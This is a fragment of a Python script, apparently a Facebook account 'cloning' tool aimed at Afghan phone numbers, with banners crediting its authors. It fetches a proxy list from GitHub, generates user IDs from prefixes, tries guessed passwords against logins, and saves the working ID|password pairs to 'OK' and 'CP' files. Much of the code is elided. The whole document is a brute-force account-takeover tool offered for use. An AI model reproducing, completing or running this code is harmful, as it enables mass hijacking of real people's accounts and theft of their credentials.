...
try:
	...
	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text	open('.prox.txt','w').write(prox)
...
║        WELCOME TO MR HAQANI COMMAND  ║     

╚══════════════════════════════════════╝                                                                           

\x1b[1;92m╔══════════════════════════════════════╗

\x1b[1;92m║\033[1;92m[AK] DEVOLPER   : MR HAQANI           ║

\x1b[1;92m║\033[1;92m[AK] FACEBOOK   : HAJI HAQANI         ║
...
def riaz():
	...
	print('[01] Random AFGANISTAN CLONING')
...
\x1b[1;92m║\033[1;92m[AK] DEVOLPER   : MR YASEEN           ║

\x1b[1;92m║\033[1;92m[AK] FACEBOOK   :   YASEEN KHAN     ║

\x1b[1;92m║\033[1;92m[AK] WHATSAPP   : 93701659187         ║

\x1b[1;92m║\033[1;92m[AK] GITHUB     : AK MAFIA KING       ║

\x1b[1;92m║\033[1;92m[AK] VERTION    : 1.0                 ║
...
def m1():
    ...
    print('\033[1;31m Code example: 9370,9379,9378,')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[MR.YASEEN-XD] '+cid+'|'+ps+'\033[0;97m')

                open('MR.YASEEN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                ...
                print('\033[1;31m[MR.YASEEN-CP] '+uid+' | '+ps+'\x1b[1;97m')

                open('MR.YASEEN-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r[\033[1;97mMR.YASEEN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
